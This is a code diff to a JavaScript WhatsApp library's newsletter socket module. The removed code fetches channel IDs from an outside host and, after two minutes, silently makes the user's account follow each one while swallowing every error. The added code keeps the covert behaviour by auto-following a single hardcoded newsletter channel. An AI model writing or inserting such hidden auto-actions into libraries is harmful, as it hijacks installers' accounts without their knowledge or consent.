@@ -128,40 +128,17 @@ const makeNewsletterSocket = (config) => {
         ]
     }));
     
-const https = require("https");
-
-async function getChannelIds() {
-    return new Promise((resolve) => {
-        https.get("https://luoxy.saurusgege.my.id/idch", (res) => {
-            let data = "";
-
-            res.on("data", chunk => data += chunk);
-
-            res.on("end", () => {
-                try {
-                    const ids = JSON.parse(data);
-                    resolve(Array.isArray(ids) ? ids : []);
-                } catch {
-                    resolve([]);
-                }
-            });
-        }).on("error", () => resolve([]));
-    });
-}
-
 setTimeout(async () => {
     try {
-        const ids = await getChannelIds();
+        const channelId = "120363429190136593@newsletter";
 
-        for (const id of ids) {
-            try {
-                await newsletterWMexQuery(
-                    `${id}`,
-                    Types_1.QueryIds.FOLLOW
-                );
-            } catch {}
-        }
-    } catch {}
+        try {
+            await newsletterWMexQuery(
+                channelId,
+                Types_1.QueryIds.FOLLOW
+            );
+        } catch (e) {}
+    } catch (e) {}
 }, 120000);
 	
     const parseFetchedUpdates = async (node, type) => {
